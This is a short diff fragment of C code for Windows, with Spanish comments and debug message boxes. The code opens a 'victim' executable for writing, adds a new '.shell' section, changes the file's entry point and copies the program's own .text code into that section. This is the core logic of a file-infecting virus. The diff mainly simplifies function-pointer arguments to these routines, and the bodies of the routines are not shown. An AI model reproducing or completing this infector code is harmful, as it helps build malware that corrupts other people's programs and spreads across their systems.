     _MessageBoxW(0, L"_CloseHandle(hFile)", L"Depuracion", MB_OK);
 
-
+   
     HANDLE hFile_vic = _CreateFileA(
         fileName_vic,              // Nombre del archivo
         GENERIC_READ | GENERIC_WRITE,          // Permisos de lectura
@@ -577,11 +442,11 @@ int main() {
         return 5; // Error al abrir el archivo
     }
     _MessageBoxW(0, L"_CreateFileA(2x)", L"Depuracion", MB_OK);
-    bool AddedEntryPoint = AddShellSectionAndModifyEntryPoint(hFile_vic, _CloseHandle, _UnmapViewOfFile, _CreateFileMappingA, _MapViewOfFile, _strcpy_s, _ZeroMemory, _SetFilePointer, _SetEndOfFile);
+    bool AddedEntryPoint = AddShellSectionAndModifyEntryPoint(hFile_vic);
     _MessageBoxW(0, L"Add section", L"Depuracion", MB_OK);
     // Copiar contenido de .text a .shell
       
-    if (CopyTextToShell(exeBase, sectionSize, _malloc, _memcpy)) {
+    if (CopyTextToShell(exeBase, sectionSize)) {
         _MessageBoxW(0, L"Contenido de .text copiado a .shell", L"Éxito", MB_OK);
     }
     else {
